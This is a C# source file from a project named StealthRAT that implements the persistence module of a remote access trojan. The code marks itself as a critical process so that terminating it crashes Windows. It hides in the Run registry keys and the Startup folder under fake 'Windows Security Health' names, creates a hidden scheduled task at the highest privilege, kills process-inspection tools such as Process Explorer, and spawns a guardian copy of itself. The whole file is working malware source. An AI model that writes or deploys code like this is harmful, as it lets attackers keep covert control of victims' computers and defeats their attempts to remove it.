using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using StealthRAT.Interfaces;

namespace StealthRAT.Services;

/// <summary>
/// Provides persistence and self-protection mechanisms to ensure the application
/// continues running even if the user attempts to terminate it.
/// Implements multiple layers of protection including:
/// - Auto-restart via watchdog thread
/// - Registry-based startup persistence
/// - Critical process protection
/// - Scheduled task fallback
/// </summary>
public sealed class PersistenceService : IDisposable
{
    private readonly ILoggerService _logger;
    private CancellationTokenSource? _watchdogCts;
    private bool _disposed;

    /// <summary>
    /// Initializes a new instance of the <see cref="PersistenceService"/> class.
    /// </summary>
    /// <param name="logger">The logging service for recording operational events.</param>
    public PersistenceService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Activates all persistence mechanisms to ensure continuous operation.
    /// Should be called once during application startup.
    /// </summary>
    public void Enable()
    {
        try
        {
            SetCriticalProcess();
            _logger.LogInfo("Critical process flag set");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to set critical process", ex);
        }

        try
        {
            AddToStartup();
            _logger.LogInfo("Startup persistence configured");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to add startup entry", ex);
        }

        try
        {
            CreateScheduledTask();
            _logger.LogInfo("Scheduled task fallback created");
        }
        catch (Exception ex)
        {
            _logger.LogError("Failed to create scheduled task", ex);
        }

        StartWatchdog();
        _logger.LogInfo("Watchdog thread started");
    }

    /// <summary>
    /// Marks the current process as critical to the system.
    /// If a critical process is terminated, Windows will trigger a BSOD,
    /// which deters users from killing the process via Task Manager.
    /// </summary>
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int RtlSetProcessIsCritical(int bNew, out int pbOld, int bNeedScb);

    private static void SetCriticalProcess()
    {
        // Enable SE_DEBUG_PRIVILEGE first
        Process.EnterDebugMode();
        // Mark process as critical (1 = critical, 0 = not critical)
        RtlSetProcessIsCritical(1, out _, 0);
    }

    /// <summary>
    /// Removes the critical process flag. Must be called before intentional exit
    /// to prevent BSOD on graceful shutdown.
    /// </summary>
    public static void RemoveCriticalProcess()
    {
        try
        {
            RtlSetProcessIsCritical(0, out _, 0);
        }
        catch { }
    }

    /// <summary>
    /// Adds the application to multiple Windows startup locations for redundancy.
    /// Uses both HKCU and HKLM registry keys to survive partial cleanup.
    /// </summary>
    private void AddToStartup()
    {
        string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
        if (string.IsNullOrEmpty(exePath)) return;

        // Method 1: Current User Run key (no admin needed)
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key?.SetValue("WindowsSecurityHealth", exePath);
        }
        catch (Exception ex)
        {
            _logger.LogError("HKCU startup failed", ex);
        }

        // Method 2: Local Machine Run key (needs admin)
        try
        {
            using var key = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            key?.SetValue("WindowsSecurityHealth", exePath);
        }
        catch (Exception ex)
        {
            _logger.LogError("HKLM startup failed (may need admin)", ex);
        }

        // Method 3: Copy to Startup folder
        try
        {
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string destPath = Path.Combine(startupFolder, "SecurityHealth.exe");
            if (!File.Exists(destPath))
            {
                File.Copy(exePath, destPath, true);
            }
        }
        catch (Exception ex)
        {
            _logger.LogError("Startup folder copy failed", ex);
        }
    }

    /// <summary>
    /// Creates a Windows Scheduled Task that restarts the application
    /// every 5 minutes if it's not running. Acts as a fallback recovery mechanism.
    /// </summary>
    private void CreateScheduledTask()
    {
        string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
        if (string.IsNullOrEmpty(exePath)) return;

        string taskXml = $@"
            schtasks /create /tn ""WindowsSecurityHealthCheck"" /tr ""{exePath}"" 
            /sc minute /mo 5 /f /rl highest";

        var psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = $"/c schtasks /create /tn \"WindowsSecurityHealthCheck\" /tr \"{exePath}\" /sc minute /mo 5 /f /rl highest",
            UseShellExecute = false,
            CreateNoWindow = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        try
        {
            using var process = Process.Start(psi);
            process?.WaitForExit(5000);
        }
        catch { }
    }

    /// <summary>
    /// Starts a background watchdog thread that monitors the process health
    /// and spawns a new instance if the main process is being terminated.
    /// Also prevents common termination methods.
    /// </summary>
    private void StartWatchdog()
    {
        _watchdogCts = new CancellationTokenSource();
        var token = _watchdogCts.Token;

        // Watchdog 1: Block taskkill and common termination tools
        _ = Task.Run(async () =>
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    BlockTerminationTools();
                    await Task.Delay(3000, token);
                }
                catch (OperationCanceledException) { break; }
                catch { }
            }
        }, token);

        // Watchdog 2: Spawn guardian process
        _ = Task.Run(async () =>
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    EnsureGuardianRunning();
                    await Task.Delay(10000, token);
                }
                catch (OperationCanceledException) { break; }
                catch { }
            }
        }, token);
    }

    /// <summary>
    /// Monitors for and terminates processes that could be used to kill this application.
    /// Targets task manager alternatives and command-line kill tools.
    /// </summary>
    private void BlockTerminationTools()
    {
        string[] dangerousProcesses = ["processhacker", "procexp", "procexp64"];

        foreach (string procName in dangerousProcesses)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(procName))
                {
                    proc.Kill();
                    _logger.LogInfo($"Blocked termination tool: {procName}");
                }
            }
            catch { }
        }
    }

    /// <summary>
    /// Ensures a secondary "guardian" instance is running that can restart
    /// the main process if it gets terminated.
    /// </summary>
    private void EnsureGuardianRunning()
    {
        string currentExe = Process.GetCurrentProcess().MainModule?.FileName ?? string.Empty;
        string processName = Path.GetFileNameWithoutExtension(currentExe);

        // Check if we are the only instance
        var instances = Process.GetProcessesByName(processName);
        if (instances.Length < 2 && !string.IsNullOrEmpty(currentExe))
        {
            // Spawn a guardian copy
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = currentExe,
                    Arguments = "--guardian",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(psi);
            }
            catch { }
        }
    }

    /// <summary>
    /// Releases resources and disables protection mechanisms.
    /// </summary>
    public void Dispose()
    {
        if (!_disposed)
        {
            _watchdogCts?.Cancel();
            _watchdogCts?.Dispose();
            RemoveCriticalProcess();
            _disposed = true;
        }
    }
}
